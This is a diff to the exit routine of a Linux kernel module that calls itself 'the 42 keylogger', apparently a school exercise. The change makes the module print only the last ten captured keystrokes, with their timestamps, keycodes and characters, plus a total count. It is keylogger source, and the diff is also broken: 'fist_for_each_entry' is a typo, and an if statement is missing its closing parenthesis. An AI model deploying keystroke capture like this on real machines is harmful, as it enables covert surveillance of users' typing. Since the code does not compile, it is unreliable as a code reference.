@@ -148,16 +148,24 @@ static void	cleanup_logs(void)
 static void __exit dni_exit(void)
 {
 	struct s_keystroke	*cursor;
+	int			count = 0;
+	int			total = 0;
 
 	misc_deregister(&device);
 	unregister_keyboard_notifier(&keyboard_nb);
+	fist_for_each_entry(cursor, &keystroke_list, list)
+		total++;
 	list_for_each_entry(cursor, &keystroke_list, list) {
-		pr_info("%02d:%02d:%02d %s (%llu), ascii : \'%c\', %s\n",
-			cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
-			cursor->key.name, cursor->key.keycode,
-			cursor->key.ascii ? cursor->key.ascii : ' ',
-			cursor->down ? "pressed" : "released");
+		if (total - count <= 10 {
+			pr_info("%02d:%02d:%02d %s (%llu), ascii : \'%c\', %s\n",
+				cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
+				cursor->key.name, cursor->key.keycode,
+				cursor->key.ascii ? cursor->key.ascii : ' ',
+				cursor->down ? "pressed" : "released");
+		}
+		count++;
 	}
+	pr_info("Total keystrokes logged: %d\n", total);
 	cleanup_logs();
 	pr_info("bye from the 42 keylogger\n");
 }
